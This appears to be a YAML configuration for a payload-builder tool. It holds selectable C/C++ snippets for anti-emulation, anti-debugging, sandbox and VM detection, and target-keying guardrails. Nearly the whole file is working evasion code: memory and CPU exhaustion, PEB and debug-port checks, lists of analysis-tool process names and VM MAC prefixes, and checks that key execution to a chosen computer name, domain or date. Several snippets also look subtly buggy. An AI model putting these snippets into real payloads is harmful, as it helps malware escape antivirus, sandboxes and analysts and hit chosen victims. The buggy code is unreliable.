# ============================================================================
# SECTIONS - Organized by Category
# ============================================================================

sections:
  # --------------------------------------------------------------------------
  # ANTI-EMULATION TECHNIQUES
  # Defeat AV/EDR emulators by exhausting resources or timing
  # --------------------------------------------------------------------------
  - header: "Anti Emulation"
    template: "antiemulation"
    display: "Anti-Emulation"
    allowMultiple: true
    items:
      - id: "None"
        display: "None (Skip)"
        default: false
        snippet: |
          // No anti-emulation

      - id: "SirAllocALot"
        display: "SirAllocALot (Memory Exhaustion)"
        default: true
        snippet: |
          // Anti-emulation: Exhaust emulator with memory allocations
          // Allocates many RW regions, sets to RX, then frees - repeated multiple times
          // This overwhelms AV emulators (memory limits, API call limits, or time limits)
          {
              const int SIR_ALLOC_COUNT = 100;
              const int SIR_ITERATION_COUNT = 5;
              const int ALLOC_SIZE = 4096;
              void* allocs[100];
              DWORD result;

              for(int i = 0; i < SIR_ITERATION_COUNT; i++) {
                  for(int n = 0; n < SIR_ALLOC_COUNT; n++) {
                      allocs[n] = VirtualAlloc(NULL, ALLOC_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                      if (allocs[n]) {
                          char *ptr = (char*)allocs[n];
                          for(int j = 0; j < ALLOC_SIZE; j++) {
                              ptr[j] = 0x23;
                          }
                      }
                  }

                  for(int n = 0; n < SIR_ALLOC_COUNT; n++) {
                      if (allocs[n]) {
                          VirtualProtect(allocs[n], ALLOC_SIZE, PAGE_EXECUTE_READ, &result);
                      }
                  }

                  for(int n = 0; n < SIR_ALLOC_COUNT; n++) {
                      if (allocs[n]) {
                          VirtualFree(allocs[n], 0, MEM_RELEASE);
                      }
                  }
              }
          }

      - id: "TimeRawKernel"
        display: "Time Delay (Kernel Time Register)"
        default: false
        snippet: |
          // Anti-emulation: Busy sleep using kernel time register
          // Uses memory address 0x7ffe0004 which is not affected by Sleep() hooks
          {
              auto get_time_raw = []() -> DWORD {
                  ULONG* PUserSharedData_TickCountMultiplier = (ULONG*)0x7ffe0004;
                  LONG* PUserSharedData_High1Time = (LONG*)0x7ffe0324;
                  ULONG* PUserSharedData_LowPart = (ULONG*)0x7ffe0320;
                  DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
                      ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
                  return kernelTime;
              };

              auto sleep_raw_ms = [&get_time_raw](DWORD sleeptime) {
                  DWORD start = get_time_raw();
                  while (get_time_raw() - start < sleeptime) {}
              };

              sleep_raw_ms(3000); // 3 second delay
          }

      - id: "DelayExecNtDelayExecution"
        display: "Delay via NtDelayExecution"
        default: false
        snippet: |
          // Anti-emulation: Direct syscall delay that cannot be easily hooked
          {
              typedef NTSTATUS (NTAPI *pNtDelayExecution)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
              HMODULE ntdll = GetModuleHandleA("ntdll.dll");
              if (ntdll) {
                  pNtDelayExecution NtDelayExec = (pNtDelayExecution)GetProcAddress(ntdll, "NtDelayExecution");
                  if (NtDelayExec) {
                      LARGE_INTEGER delay;
                      delay.QuadPart = -50000000LL; // 5 seconds in 100ns intervals (negative = relative)
                      NtDelayExec(FALSE, &delay);
                  }
              }
          }

      - id: "HeavyComputation"
        display: "Heavy Computation (CPU Exhaustion)"
        default: false
        snippet: |
          // Anti-emulation: Heavy computation to exhaust emulator cycles
          {
              volatile unsigned int result = 0;
              for (unsigned int i = 0; i < 50000000; i++) {
                  result ^= i;
                  result = (result << 1) | (result >> 31);
                  result += i * 7;
              }
              // Use result to prevent optimization
              if (result == 0xDEADBEEF) return 1;
          }

      - id: "FlsCallbacks"
        display: "FLS Callback Abuse"
        default: false
        snippet: |
          // Anti-emulation: Abuse FLS (Fiber Local Storage) callbacks
          // Many emulators don't properly implement FLS callbacks
          {
              volatile BOOL flsCalled = FALSE;
              auto flsCallback = [](PVOID lpFlsData) -> VOID {
                  *(volatile BOOL*)lpFlsData = TRUE;
              };
              
              DWORD flsIndex = FlsAlloc((PFLS_CALLBACK_FUNCTION)flsCallback);
              if (flsIndex != FLS_OUT_OF_INDEXES) {
                  FlsSetValue(flsIndex, (PVOID)&flsCalled);
                  FlsFree(flsIndex);
                  
                  if (!flsCalled) {
                      // FLS callback wasn't called - likely in emulator
                      return 0;
                  }
              }
          }

  # --------------------------------------------------------------------------
  # ANTI-DEBUGGING TECHNIQUES
  # Detect and evade debuggers
  # --------------------------------------------------------------------------
  - header: "Anti Debugging"
    template: "antidebugging"
    display: "Anti-Debugging"
    allowMultiple: true
    items:
      - id: "None"
        display: "None (Skip)"
        default: false
        snippet: |
          // No anti-debugging

      - id: "IsDebuggerPresent"
        display: "IsDebuggerPresent API"
        default: true
        snippet: |
          // Anti-debug: Check IsDebuggerPresent
          if (IsDebuggerPresent()) {
              return 0;
          }

      - id: "CheckRemoteDebuggerPresent"
        display: "CheckRemoteDebuggerPresent API"
        default: false
        snippet: |
          // Anti-debug: Check for remote debugger
          {
              BOOL debuggerPresent = FALSE;
              if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent)) {
                  if (debuggerPresent) {
                      return 0;
                  }
              }
          }

      - id: "PebBeingDebugged"
        display: "PEB BeingDebugged Flag"
        default: false
        snippet: |
          // Anti-debug: Direct PEB check
          {
              #ifdef _WIN64
              PPEB pPeb = (PPEB)__readgsqword(0x60);
              #else
              PPEB pPeb = (PPEB)__readfsdword(0x30);
              #endif
              if (pPeb->BeingDebugged) {
                  return 0;
              }
          }

      - id: "NtGlobalFlag"
        display: "NtGlobalFlag Check"
        default: false
        snippet: |
          // Anti-debug: Check NtGlobalFlag in PEB
          // Debuggers set heap flags: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
          {
              #ifdef _WIN64
              PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)__readgsqword(0x60) + 0xBC);
              #else
              PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)__readfsdword(0x30) + 0x68);
              #endif
              if (*pNtGlobalFlag & 0x70) { // FLG_HEAP_* flags
                  return 0;
              }
          }

      - id: "HeapFlags"
        display: "Heap Flags Check"
        default: false
        snippet: |
          // Anti-debug: Check heap flags set by debugger
          {
              #ifdef _WIN64
              PPEB pPeb = (PPEB)__readgsqword(0x60);
              PVOID heap = (PVOID)*(PDWORD_PTR)((PBYTE)pPeb + 0x30);
              DWORD heapFlags = *(PDWORD)((PBYTE)heap + 0x70);
              DWORD forceFlags = *(PDWORD)((PBYTE)heap + 0x74);
              #else
              PPEB pPeb = (PPEB)__readfsdword(0x30);
              PVOID heap = (PVOID)*(PDWORD)((PBYTE)pPeb + 0x18);
              DWORD heapFlags = *(PDWORD)((PBYTE)heap + 0x40);
              DWORD forceFlags = *(PDWORD)((PBYTE)heap + 0x44);
              #endif
              if (heapFlags & ~HEAP_GROWABLE || forceFlags != 0) {
                  return 0;
              }
          }

      - id: "CloseHandleException"
        display: "CloseHandle Invalid Handle"
        default: false
        snippet: |
          // Anti-debug: CloseHandle with invalid handle causes exception under debugger
          __try {
              CloseHandle((HANDLE)0xDEADBEEF);
          }
          __except (GetExceptionCode() == EXCEPTION_INVALID_HANDLE ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
              // Exception caught = debugger present
              return 0;
          }

      - id: "OutputDebugString"
        display: "OutputDebugString Error Check"
        default: false
        snippet: |
          // Anti-debug: OutputDebugString sets error differently when debugger present
          {
              SetLastError(0);
              OutputDebugStringA("Test");
              if (GetLastError() == 0) {
                  // Debugger consumed the string
                  return 0;
              }
          }

      - id: "HardwareBreakpoints"
        display: "Hardware Breakpoints Detection"
        default: false
        snippet: |
          // Anti-debug: Check for hardware breakpoints via debug registers
          {
              CONTEXT ctx = {0};
              ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
              if (GetThreadContext(GetCurrentThread(), &ctx)) {
                  if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
                      return 0;
                  }
              }
          }

      - id: "TimingRdtsc"
        display: "RDTSC Timing Check"
        default: false
        snippet: |
          // Anti-debug: Timing check using RDTSC
          // Debugger stepping causes significant delay
          {
              unsigned __int64 start = __rdtsc();
              
              // Small operation
              volatile int x = 0;
              for (int i = 0; i < 100; i++) x++;
              
              unsigned __int64 end = __rdtsc();
              
              // Threshold for normal execution (adjust based on CPU)
              if ((end - start) > 0x100000) {
                  return 0;
              }
          }

      - id: "NtQueryInformationProcess"
        display: "NtQueryInformationProcess Debug Port"
        default: false
        snippet: |
          // Anti-debug: Query debug port via NtQueryInformationProcess
          {
              typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
              HMODULE ntdll = GetModuleHandleA("ntdll.dll");
              if (ntdll) {
                  pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
                  if (NtQIP) {
                      HANDLE debugPort = NULL;
                      NTSTATUS status = NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL); // ProcessDebugPort = 7
                      if (status == 0 && debugPort != NULL) {
                          return 0;
                      }
                  }
              }
          }

      - id: "ParentProcessCheck"
        display: "Parent Process Check"
        default: false
        snippet: |
          // Anti-debug: Check if parent process is a known debugger
          {
              typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
              HMODULE ntdll = GetModuleHandleA("ntdll.dll");
              if (ntdll) {
                  pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
                  if (NtQIP) {
                      struct { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } pbi;
                      if (NtQIP(GetCurrentProcess(), 0, &pbi, sizeof(pbi), NULL) == 0) {
                          HANDLE hParent = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)(ULONG_PTR)pbi.Reserved3);
                          if (hParent) {
                              WCHAR parentName[MAX_PATH] = {0};
                              DWORD size = MAX_PATH;
                              if (QueryFullProcessImageNameW(hParent, 0, parentName, &size)) {
                                  _wcslwr_s(parentName, MAX_PATH);
                                  if (wcsstr(parentName, L"ollydbg") || wcsstr(parentName, L"x64dbg") ||
                                      wcsstr(parentName, L"windbg") || wcsstr(parentName, L"ida") ||
                                      wcsstr(parentName, L"immunity") || wcsstr(parentName, L"radare")) {
                                      CloseHandle(hParent);
                                      return 0;
                                  }
                              }
                              CloseHandle(hParent);
                          }
                      }
                  }
              }
          }

      - id: "TrapFlag"
        display: "Trap Flag Detection"
        default: false
        snippet: |
          // Anti-debug: Single-step trap flag detection
          __try {
              __asm {
                  pushfd
                  or dword ptr [esp], 0x100 ; Set trap flag
                  popfd
                  nop
              }
          }
          __except(EXCEPTION_EXECUTE_HANDLER) {
              // Normal execution - exception handler called
              goto trap_ok;
          }
          // If we get here, debugger consumed the exception
          return 0;
          trap_ok:;

  # --------------------------------------------------------------------------
  # ANTI-SANDBOX / VM DETECTION
  # Detect sandbox and virtual machine environments
  # --------------------------------------------------------------------------
  - header: "Anti Sandbox"
    template: "antisandbox"
    display: "Anti-Sandbox/VM"
    allowMultiple: true
    items:
      - id: "None"
        display: "None (Skip)"
        default: true
        snippet: |
          // No anti-sandbox

      - id: "CpuidHypervisor"
        display: "CPUID Hypervisor Bit"
        default: false
        snippet: |
          // Anti-sandbox: Check CPUID hypervisor bit
          {
              int cpuInfo[4] = {0};
              __cpuid(cpuInfo, 1);
              if (cpuInfo[2] & (1 << 31)) {
                  // Hypervisor present
                  return 0;
              }
          }

      - id: "CpuidVMVendor"
        display: "CPUID VM Vendor String"
        default: false
        snippet: |
          // Anti-sandbox: Check for VM vendor strings via CPUID
          {
              int cpuInfo[4] = {0};
              __cpuid(cpuInfo, 0x40000000);
              char vendor[13] = {0};
              memcpy(vendor, &cpuInfo[1], 4);
              memcpy(vendor + 4, &cpuInfo[2], 4);
              memcpy(vendor + 8, &cpuInfo[3], 4);
              
              // Known VM vendors
              if (strstr(vendor, "VMwareVMware") || strstr(vendor, "Microsoft Hv") ||
                  strstr(vendor, "VBoxVBoxVBox") || strstr(vendor, "KVMKVMKVM") ||
                  strstr(vendor, "XenVMMXenVMM") || strstr(vendor, "prl hyperv")) {
                  return 0;
              }
          }

      - id: "MacAddressCheck"
        display: "MAC Address VM Detection"
        default: false
        snippet: |
          // Anti-sandbox: Check for VM MAC address prefixes
          {
              IP_ADAPTER_INFO adapterInfo[16];
              DWORD bufLen = sizeof(adapterInfo);
              if (GetAdaptersInfo(adapterInfo, &bufLen) == ERROR_SUCCESS) {
                  PIP_ADAPTER_INFO pAdapter = adapterInfo;
                  while (pAdapter) {
                      // VMware: 00:0C:29, 00:50:56, 00:05:69
                      // VirtualBox: 08:00:27
                      // Hyper-V: 00:15:5D
                      // Parallels: 00:1C:42
                      if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x0C && pAdapter->Address[2] == 0x29) ||
                          (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x50 && pAdapter->Address[2] == 0x56) ||
                          (pAdapter->Address[0] == 0x08 && pAdapter->Address[1] == 0x00 && pAdapter->Address[2] == 0x27) ||
                          (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x15 && pAdapter->Address[2] == 0x5D) ||
                          (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x1C && pAdapter->Address[2] == 0x42)) {
                          return 0;
                      }
                      pAdapter = pAdapter->Next;
                  }
              }
          }

      - id: "RegistryVMCheck"
        display: "Registry VM Artifacts"
        default: false
        snippet: |
          // Anti-sandbox: Check registry for VM artifacts
          {
              HKEY hKey;
              const wchar_t* vmKeys[] = {
                  L"SOFTWARE\\VMware, Inc.\\VMware Tools",
                  L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
                  L"SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
                  L"SYSTEM\\CurrentControlSet\\Services\\vmci",
                  L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"
              };
              for (int i = 0; i < 5; i++) {
                  if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, vmKeys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                      RegCloseKey(hKey);
                      return 0;
                  }
              }
          }

      - id: "ProcessListCheck"
        display: "Sandbox Process Detection"
        default: false
        snippet: |
          // Anti-sandbox: Check for sandbox/analysis processes
          {
              const wchar_t* sandboxProcs[] = {
                  L"vmtoolsd.exe", L"vmwaretray.exe", L"vmwareuser.exe",
                  L"vboxservice.exe", L"vboxtray.exe",
                  L"sandboxiedcomlaunch.exe", L"sandboxierpcss.exe",
                  L"procmon.exe", L"procmon64.exe", L"procexp.exe", L"procexp64.exe",
                  L"wireshark.exe", L"fiddler.exe", L"tcpview.exe",
                  L"autoruns.exe", L"filemon.exe", L"regmon.exe",
                  L"idaq.exe", L"idaq64.exe", L"x64dbg.exe", L"x32dbg.exe"
              };
              
              HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
              if (hSnap != INVALID_HANDLE_VALUE) {
                  PROCESSENTRY32W pe32 = {sizeof(pe32)};
                  if (Process32FirstW(hSnap, &pe32)) {
                      do {
                          for (int i = 0; i < 19; i++) {
                              if (_wcsicmp(pe32.szExeFile, sandboxProcs[i]) == 0) {
                                  CloseHandle(hSnap);
                                  return 0;
                              }
                          }
                      } while (Process32NextW(hSnap, &pe32));
                  }
                  CloseHandle(hSnap);
              }
          }

      - id: "LowResourceCheck"
        display: "Low Resource Detection"
        default: false
        snippet: |
          // Anti-sandbox: Check for unrealistically low system resources
          {
              // Check RAM (sandboxes often have <2GB)
              MEMORYSTATUSEX memStatus = {sizeof(memStatus)};
              if (GlobalMemoryStatusEx(&memStatus)) {
                  if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) { // < 2GB
                      return 0;
                  }
              }
              
              // Check disk size (sandboxes often have <60GB)
              ULARGE_INTEGER totalBytes;
              if (GetDiskFreeSpaceExW(L"C:\\", NULL, &totalBytes, NULL)) {
                  if (totalBytes.QuadPart < 60ULL * 1024 * 1024 * 1024) { // < 60GB
                      return 0;
                  }
              }
              
              // Check number of processors
              SYSTEM_INFO sysInfo;
              GetSystemInfo(&sysInfo);
              if (sysInfo.dwNumberOfProcessors < 2) {
                  return 0;
              }
          }

      - id: "UsernameCheck"
        display: "Sandbox Username Detection"
        default: false
        snippet: |
          // Anti-sandbox: Check for common sandbox usernames
          {
              WCHAR username[256];
              DWORD size = 256;
              if (GetUserNameW(username, &size)) {
                  _wcslwr_s(username, 256);
                  const wchar_t* sandboxUsers[] = {
                      L"sandbox", L"virus", L"malware", L"maltest", L"test",
                      L"sample", L"vmware", L"vbox", L"analysis", L"cuckoo",
                      L"john doe", L"user", L"currentuser", L"admin"
                  };
                  for (int i = 0; i < 14; i++) {
                      if (wcsstr(username, sandboxUsers[i])) {
                          return 0;
                      }
                  }
              }
          }

      - id: "RecentFilesCheck"
        display: "Recent Files Check"
        default: false
        snippet: |
          // Anti-sandbox: Check for user activity (recent files)
          // Sandboxes typically have no user activity
          {
              WCHAR recentPath[MAX_PATH];
              if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, recentPath))) {
                  WIN32_FIND_DATAW fd;
                  WCHAR searchPath[MAX_PATH];
                  wsprintfW(searchPath, L"%s\\*", recentPath);
                  HANDLE hFind = FindFirstFileW(searchPath, &fd);
                  if (hFind != INVALID_HANDLE_VALUE) {
                      int fileCount = 0;
                      do {
                          if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                              fileCount++;
                          }
                      } while (FindNextFileW(hFind, &fd) && fileCount < 10);
                      FindClose(hFind);
                      
                      if (fileCount < 5) {
                          // Too few recent files - likely sandbox
                          return 0;
                      }
                  }
              }
          }

      - id: "ScreenResolutionCheck"
        display: "Screen Resolution Check"
        default: false
        snippet: |
          // Anti-sandbox: Check screen resolution
          // Sandboxes often use low/unusual resolutions
          {
              int width = GetSystemMetrics(SM_CXSCREEN);
              int height = GetSystemMetrics(SM_CYSCREEN);
              
              // Most real systems have at least 1024x768
              if (width < 1024 || height < 768) {
                  return 0;
              }
              
              // Check for suspicious exact sandbox resolutions
              if (width == 800 && height == 600) {
                  return 0;
              }
          }

      - id: "FileTimeCheck"
        display: "Installation Age Check"
        default: false
        snippet: |
          // Anti-sandbox: Check if Windows was recently installed
          // Sandboxes have recent install times
          {
              WCHAR windowsDir[MAX_PATH];
              if (GetWindowsDirectoryW(windowsDir, MAX_PATH)) {
                  WIN32_FILE_ATTRIBUTE_DATA fileInfo;
                  if (GetFileAttributesExW(windowsDir, GetFileExInfoStandard, &fileInfo)) {
                      FILETIME now;
                      GetSystemTimeAsFileTime(&now);
                      
                      ULARGE_INTEGER installTime, currentTime;
                      installTime.LowPart = fileInfo.ftCreationTime.dwLowDateTime;
                      installTime.HighPart = fileInfo.ftCreationTime.dwHighDateTime;
                      currentTime.LowPart = now.dwLowDateTime;
                      currentTime.HighPart = now.dwHighDateTime;
                      
                      // Check if installed less than 1 day ago (in 100ns intervals)
                      ULONGLONG oneDay = 10000000ULL * 60 * 60 * 24;
                      if (currentTime.QuadPart - installTime.QuadPart < oneDay) {
                          return 0;
                      }
                  }
              }
          }

  # --------------------------------------------------------------------------
  # GUARDRAILS
  # Keying and environmental requirements
  # --------------------------------------------------------------------------
  - header: "Guardrails"
    template: "guardrail"
    display: "Guardrails"
    allowMultiple: true
    inputs:
      - id: "guardrailParamTextBox"
        type: "textbox"
        label: "Guardrail parameter"
        placement: "before"
        width: 240
        required: false
        defaultValue: "COMPUTERNAME#contains#TARGET"
        infoAction: "GuardRailInfo"
        infoButtonLabel: "Info"
    items:
      - id: "None"
        display: "None (Skip)"
        default: true
        snippet: |
          // No guardrails

      - id: "EnvVarExists"
        display: "Environment Variable Exists"
        default: false
        snippet: |
          // Guardrail: Require environment variable to exist
          if (GetEnvironmentVariableW(L"__GUARDRAIL_PARAM__", nullptr, 0) == 0) {
              return 0;
          }

      - id: "EnvVarContains"
        display: "Environment Variable Contains Value"
        default: false
        snippet: |
          // Guardrail: Environment variable must contain specific value
          {
              auto my_tolower = [](char c) -> char {
                  return (c >= 'A' && c <= 'Z') ? c + 32 : c;
              };
              
              auto contains_ci = [&my_tolower](const char* haystack, const char* needle) -> bool {
                  if (!haystack || !needle) return false;
                  for (; *haystack; haystack++) {
                      const char* h = haystack;
                      const char* n = needle;
                      while (*h && *n && my_tolower(*h) == my_tolower(*n)) { h++; n++; }
                      if (*n == '\0') return true;
                  }
                  return false;
              };
              
              char buffer[1024];
              DWORD result = GetEnvironmentVariableA("COMPUTERNAME", buffer, 1024);
              if (result == 0 || !contains_ci(buffer, "__GUARDRAIL_PARAM__")) {
                  return 0;
              }
          }

      - id: "DomainCheck"
        display: "Domain Membership Check"
        default: false
        snippet: |
          // Guardrail: Require domain membership
          {
              WCHAR domainName[256];
              DWORD size = 256;
              NETSETUP_JOIN_STATUS status;
              if (NetGetJoinInformation(NULL, (LPWSTR*)&domainName, &status) == NERR_Success) {
                  if (status != NetSetupDomainName) {
                      NetApiBufferFree(domainName);
                      return 0; // Not joined to a domain
                  }
                  // Optionally check specific domain
                  // if (_wcsicmp(domainName, L"TARGETDOMAIN") != 0) return 0;
                  NetApiBufferFree(domainName);
              }
          }

      - id: "DateRangeCheck"
        display: "Execution Date Range"
        default: false
        snippet: |
          // Guardrail: Only execute within date range
          {
              SYSTEMTIME st;
              GetLocalTime(&st);
              
              // Configure your date range (YYYY, MM, DD)
              WORD startYear = 2024, startMonth = 1, startDay = 1;
              WORD endYear = 2025, endMonth = 12, endDay = 31;
              
              DWORD current = (st.wYear * 10000) + (st.wMonth * 100) + st.wDay;
              DWORD start = (startYear * 10000) + (startMonth * 100) + startDay;
              DWORD end = (endYear * 10000) + (endMonth * 100) + endDay;
              
              if (current < start || current > end) {
                  return 0;
              }
          }

      - id: "FileExistsCheck"
        display: "Required File Exists"
        default: false
        snippet: |
          // Guardrail: Required file must exist
          {
              DWORD attr = GetFileAttributesW(L"C:\\Users\\target\\Desktop\\marker.txt");
              if (attr == INVALID_FILE_ATTRIBUTES) {
                  return 0;
              }
          }

